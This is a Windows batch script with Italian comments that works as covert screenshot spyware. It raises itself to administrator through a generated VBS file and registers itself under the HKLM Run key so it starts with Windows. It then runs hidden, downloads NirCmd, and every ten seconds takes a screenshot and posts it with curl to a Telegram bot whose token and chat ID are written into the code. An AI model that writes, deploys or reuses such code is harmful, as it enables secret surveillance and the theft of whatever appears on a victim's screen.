@echo off
if "%1" == "hide" goto :main

:: Auto-elevazione a amministratore
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Richiesta elevazione privilegi...
    set "batchPath=%~0"
    set "batchArgs=%*"
    :: Creazione file VBS per l'elevazione
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c """"%batchPath%"" hide %batchArgs%""", "", "runas", 0 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs"
    exit /b
)

:: Installazione per l'avvio automatico
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "TelegramScreenshot" /t REG_SZ /d "\"%~dpnx0\" hide" /f

:: Esecuzione invisibile
start /B "" "%~dpnx0" hide
exit

:main
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
set "CHAT_ID=5709299213"
set "INTERVAL=10"
set "TEMP_DIR=%TEMP%\telegram_screenshots"

:: Crea la cartella temporanea
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

:: Controlla e installa NirCmd se necessario
if not exist "%SystemRoot%\nircmd.exe" (
    bitsadmin /transfer downloadNirCmd /download /priority normal "https://www.nirsoft.net/utils/nircmd.zip" "%TEMP%\nircmd.zip"
    powershell -Command "Expand-Archive -Path '%TEMP%\nircmd.zip' -DestinationPath '%SystemRoot%'"
    del "%TEMP%\nircmd.zip"
    if exist "%SystemRoot%\nircmd-x64.exe" ren "%SystemRoot%\nircmd-x64.exe" nircmd.exe
)

:loop
    set "timestamp=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
    set "timestamp=!timestamp:/=!"
    set "timestamp=!timestamp: =0!"
    set "filename=%TEMP_DIR%\screenshot_!timestamp!.png"

    nircmd.exe savescreenshot "!filename!"

    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
        -F chat_id="%CHAT_ID%" ^
        -F photo=@"!filename!" >nul 2>&1

    del "!filename!" >nul 2>&1

    ping -n %INTERVAL% 127.0.0.1 >nul
goto loop
